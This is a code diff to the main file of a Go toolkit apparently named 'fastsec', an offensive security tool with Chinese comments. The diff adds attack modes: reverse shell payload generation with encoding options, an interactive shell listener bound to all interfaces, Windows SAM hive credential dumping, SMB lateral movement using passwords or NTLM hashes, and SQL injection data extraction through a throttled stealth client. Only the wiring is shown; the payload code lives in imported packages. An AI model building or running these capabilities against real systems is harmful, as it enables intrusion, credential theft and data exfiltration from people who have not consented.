@@ -18,6 +18,11 @@ import (
 	"fastsec/internal/brute"
 	"fastsec/internal/audit"
 	"fastsec/internal/cms"
+	"fastsec/internal/creds"
+	"fastsec/internal/dump"
+	"fastsec/internal/listener"
+	"fastsec/internal/shell"
+	"fastsec/internal/smb"
 	"fastsec/internal/crack"
 	"fastsec/internal/diff"
 	"fastsec/internal/dir"
@@ -82,6 +87,19 @@ func main() {
 	filePath := flag.String("file", "", "forensic file analysis")
 	userSearch := flag.String("user", "", "username search across platforms")
 	scanTarget := flag.String("scan", "", "port scan target")
+	shellLang := flag.String("shell", "", "reverse shell language (bash/python/perl/php/powershell...)")
+	shellHost := flag.String("s-host", "127.0.0.1", "reverse shell listener host")
+	shellPort := flag.Int("s-port", 4444, "reverse shell listener port")
+	shellEnc := flag.String("s-enc", "raw", "payload encoding: raw|base64|hex|url")
+	listenPort := flag.Int("listen", 0, "reverse shell listener port (interactive)")
+	samFile := flag.String("sam", "", "SAM hive file for credential extraction")
+	systemFile := flag.String("system", "", "SYSTEM hive file for bootkey")
+	smbHost := flag.String("smb", "", "SMB lateral movement target host")
+	smbCmd := flag.String("smb-cmd", "whoami", "command to execute via SMB")
+	smbUser := flag.String("smb-user", "administrator", "SMB username")
+	smbPass := flag.String("smb-pass", "", "SMB password or NTLM hash")
+	dumpURL := flag.String("dump", "", "SQL injection data extraction URL")
+	dumpParam := flag.String("dump-param", "id", "SQL injection param for extraction")
 	scanRange := flag.String("scan-range", "1-1000", "port scan range (start-end)")
 	seqFile := flag.String("seq", "", "stateful attack sequence YAML file")
 	topN := flag.Int("top", 5, "top-N prioritized params to show (with -diff)")
@@ -112,7 +130,8 @@ func main() {
 	hasMode := *bruteTarget != "" || *dirURL != "" || *socengName != "" ||
 		*orchestrateTarget != "" || *osintDomain != "" || *injectParams != "" || *diffParams != "" || *seqFile != "" ||
 		*fingerprintTarget != "" || *crackHash != "" || *kerberosKDC != "" || *cmsURL != "" || *auditPath != "" ||
-		*filePath != "" || *userSearch != "" || *scanTarget != ""
+		*filePath != "" || *userSearch != "" || *scanTarget != "" ||
+		*shellLang != "" || *listenPort > 0 || *samFile != "" || *smbHost != "" || *dumpURL != ""
 
 	var targets []string
 	if *url != "" {
@@ -446,6 +465,88 @@ func main() {
 		}
 		res := portscan.ScanRange(*scanTarget, start, end, 500*time.Millisecond, *concurrency)
 		fmt.Print(portscan.Format(res))
+		return
+	}
+
+	// 反弹 Shell 生成模式
+	if *shellLang != "" {
+		p, err := shell.Generate(*shellLang, *shellHost, *shellPort, *shellEnc)
+		if err != nil {
+			fmt.Printf("[shell] %v\n", err)
+		} else {
+			fmt.Printf("[shell] %s → %s:%d (%s encoding)\n", p.Lang, *shellHost, *shellPort, p.Encoding)
+			fmt.Println("  raw: " + p.Raw)
+			fmt.Println("  enc: " + p.Encoded)
+		}
+		return
+	}
+
+	// 监听器模式（交互式）
+	if *listenPort > 0 {
+		ln := listener.New("0.0.0.0", *listenPort)
+		if err := ln.Start(); err != nil {
+			fmt.Printf("[listener] %v\n", err)
+			return
+		}
+		go ln.AcceptLoop()
+		fmt.Println("[listener] 等待连接... 输入 list 查看会话")
+		scanner := bufio.NewScanner(os.Stdin)
+		for scanner.Scan() {
+			line := strings.TrimSpace(scanner.Text())
+			switch {
+			case line == "list" || line == "ls":
+				fmt.Print(ln.ListSessions())
+			case strings.HasPrefix(line, "use "):
+				var id int
+				fmt.Sscanf(strings.TrimPrefix(line, "use "), "%d", &id)
+				if _, ok := ln.GetSession(id); !ok {
+					fmt.Printf("[listener] 会话 #%d 不存在\n", id)
+				} else {
+					ln.Interactive(id)
+				}
+			case line == "exit" || line == "quit":
+				fmt.Println("[listener] 退出")
+				return
+			default:
+				fmt.Println("  help/list/use <id>/exit/quit")
+			}
+		}
+		return
+	}
+
+	// 凭据转储模式
+	if *samFile != "" {
+		res, err := creds.Extract(*samFile, *systemFile)
+		if err != nil {
+			fmt.Printf("[creds] %v\n", err)
+		} else {
+			fmt.Print(creds.Format(res))
+		}
+		return
+	}
+
+	// SMB 横向移动模式
+	if *smbHost != "" {
+		cfg := &smb.Config{Host: *smbHost, User: *smbUser}
+		if *smbPass != "" {
+			cfg.Password = *smbPass
+		}
+		res := smb.ExecRemote(cfg, *smbCmd)
+		if res.Success {
+			fmt.Printf("[smb] %s 执行成功:\n%s\n", res.Command, res.Output)
+		} else {
+			fmt.Printf("[smb] %s: %s\n", res.Command, res.Output)
+		}
+		return
+	}
+
+	// SQL 数据提取模式
+	if *dumpURL != "" {
+		cli := stealth.NewClient(*proxy, stealth.NewThrottle(*minDelay, *maxDelay), *concurrency)
+		dcfg := &dump.Config{BaseURL: *dumpURL, Param: *dumpParam, DBMS: "mysql"}
+		d := dump.New(dcfg, cli)
+		res := d.Run()
+		fmt.Print(dump.Format(res))
 		return
 	}
 
